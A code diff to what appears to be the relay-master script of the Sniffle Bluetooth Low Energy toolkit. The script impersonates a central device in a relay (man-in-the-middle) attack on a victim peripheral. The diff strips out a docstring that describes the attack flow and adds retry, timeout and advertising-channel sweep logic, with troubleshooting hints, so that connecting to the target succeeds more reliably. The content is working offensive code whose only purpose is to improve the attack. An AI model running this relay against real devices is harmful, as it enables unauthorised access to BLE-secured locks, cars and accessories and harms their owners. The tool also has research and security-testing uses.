@@ -21,53 +21,7 @@ from sniffle.packet_decoder import DPacketMessage, DataMessage, LlDataContMessag
 from sniffle.relay_protocol import RelayServer, MessageType, ErrorCode
 
 """
-Relay attack principles:
-
-C refers to the real central (initiator/master)
-P refers to the real peripheral (advertiseer/slave)
-C_r refers to relay_master.py (relay impersonating central)
-P_r refers to relay_slave.py (relay impersonating peripheral)
-
-Relay master script also has a network listener, relay slave connects to it.
-
-First, the relay master (C_r) gathers the adverisement body and scan response
-from the victim peripheral (P). Next, the advertisement data is passed onto
-the relay slave (P_r) to mimic the victim peripheral. Once the victim
-central (C) connects to the relay slave (P_r) mimicking the victim peripheral,
-the relay slave will inform the relay master, so that it can start its own
-connection to the real victim peripheral with potentially different parameters.
-
-C               P_r             C_r             P
-                                <----------Advert
-                                ScanReq--------->
-                                <---------ScanRsp
-                <---------Advert
-                <--------ScanRsp
-<---------Advert
-ScanReq-------->
-<--------ScanRsp
-ConnReq-------->
-(I starts channel hopping with P_r)
-                ConnReq-------->
-                                (wait for next advert)
-                                <----------Advert
-                                ConnReq--------->
-
-Once connected, data can be encrypted, but we don't care, we just pass it on.
-One limitation is that encrypted LL_CONTROL messages could change hopping
-parameters, but we can't decipher them. It may be possible to make an educated
-guess of what the control messages are though based on past behaviour.
-
-C               P_r             C_r             P
-Encrypted------>
-<----------Empty
-                Encrypted----->
-                                Encrypted------>
-                                <--------EncResp
-                <--------EncResp
-(wait for next conn event)
-Empty--------->
-<-------EncResp
+(omitted banner for brevity)
 """
 
 # global variable to access hardware
@@ -104,7 +58,20 @@ def main():
     aparse.add_argument("-F", "--fastmaster", action="store_const", default=False, const=True,
             help="Relay master should specify a fast connection interval")
     aparse.add_argument("-o", "--output", default=None, help="PCAP output file name")
+
+    # ---- NEW: retry controls
+    aparse.add_argument("--retries", type=int, default=8,
+            help="Number of connection attempts before giving up (default: 8)")
+    aparse.add_argument("--try-timeout-ms", type=int, default=1800,
+            help="Timeout per initiation attempt in ms (default: 1800)")
+    aparse.add_argument("--chan", choices=["37", "38", "39", "all"], default=None,
+            help="Advertising channel to initiate on; 'all' sweeps 37/38/39")
+
     args = aparse.parse_args()
+
+    # default --chan to the chosen --advchan if not provided
+    if args.chan is None:
+        args.chan = str(args.advchan)
 
     global hw
     hw = SniffleHW(args.serport)
@@ -227,29 +194,66 @@ def main():
             tup = (int(tsplit[0]), int(tsplit[1]))
             preloads.append(tup)
 
-    #input("Press Enter to initiate (send CONNECT_IND on next advert)...")
-    #print('Send connection request...')
-    # connect to real target, impersonating who connected to relay slave
-    connect_target(mac_bytes, args.advchan, not args.public, connector_addr,
-            connector_random, connector_interval, connector_latency, preloads)
-  #  print('Send connection request 1 sent')
-    # wait for transition to master state
-    while True:
-        msg = hw.recv_and_decode()
-        print(msg)
-        if isinstance(msg, StateMessage) and msg.new_state == SnifferState.CENTRAL:
+    # --- RETRYING INITIATION -------------------------------------------------
+    input("Press Enter to initiate (send CONNECT_IND on next advert)...")
+
+    # Build channel plan
+    if args.chan == "all":
+        chan_plan = [37, 38, 39]
+    else:
+        chan_plan = [int(args.chan)]
+
+    def attempt_connect_once(chan, timeout_ms):
+        """Arm initiator on a single channel and wait up to timeout_ms for CENTRAL."""
+        print(f"[init] Arming attempt on adv channel {chan}...")
+        connect_target(
+            mac_bytes, chan, not args.public,
+            connector_addr, connector_random,
+            connector_interval, connector_latency, preloads
+        )
+        deadline = time() + (timeout_ms / 1000.0)
+        while True:
+            remaining = deadline - time()
+            if remaining <= 0:
+                print("[init] Attempt timed out.")
+                return False
+            # Wait for serial messages up to 'remaining' seconds
+            try:
+                ready, _, _ = select([hw.ser.fd], [], [], remaining)
+            except Exception:
+                # Fallback: block a short fixed time (POSIX select on serial may not exist on some systems)
+                ready = [hw.ser.fd]
+            if not ready:
+                continue
+            msg = hw.recv_and_decode()
+            print(msg)
+            if isinstance(msg, StateMessage) and msg.new_state == SnifferState.CENTRAL:
+                print("[init] CENTRAL reached.")
+                return True
+            # Otherwise loop until timeout, printing debug/measurement too
+
+    ok = False
+    for attempt in range(args.retries):
+        chan = chan_plan[attempt % len(chan_plan)]
+        print(f"[init] Attempt {attempt+1}/{args.retries} on adv channel {chan}...")
+        ok = attempt_connect_once(chan, args.try_timeout_ms)
+        if ok:
             hw.decoder_state.cur_aa = conn_req.aa_conn
+            print("Connected to target.\n")
             break
-    print("Connected to target.", end='\n\n')
+        # Quiet state between attempts so RX buffers don't fill
+        hw.setup_sniffer(mode=SnifferMode.PASSIVE_SCAN, rssi_min=0)
+
+    if not ok:
+        print("Failed to connect after retries. Check:")
+        print(" - Peripheral still advertising LEGACY ADV_IND (not extended/AUX)?")
+        print(" - Address type correct (public vs random)?")
+        print(" - RPA rotated? Use --irk or refresh the MAC.")
+        print(" - Try --chan all and/or longer --try-timeout-ms.")
+        return
+    # -------------------------------------------------------------------------
 
     # request legitimate master (relay slave) to use a fast connection interval
-    # LL Control (0x03), length 24 (0x18), LL_CONNECTION_PARAM_REQ (0x0F)
-    # interval: 0x0006 to 0x000A (7.5 to 15 ms)
-    # latency: 0
-    # timeout: 0x01F4 (5 seconds)
-    # preferred periodicity: 3
-    # reference event: 0x0005
-    # offsets: 0x0001, 0x0002, 0x0003, 0x0004, 0x0005, 0x0000
     if args.fastslave:
         conn_update_pdu = DPacketMessage.from_body(b'\x03\x18\x0f\x06\x00\x0c\x00\x00\x00\xf4\x01\x03'
                 b'\x05\x00\x01\x00\x02\x00\x03\x00\x04\x00\x05\x00\x00\x00')
@@ -435,3 +439,4 @@ def print_packet(pkt, quiet=False):
 
 if __name__ == "__main__":
     main()
+        
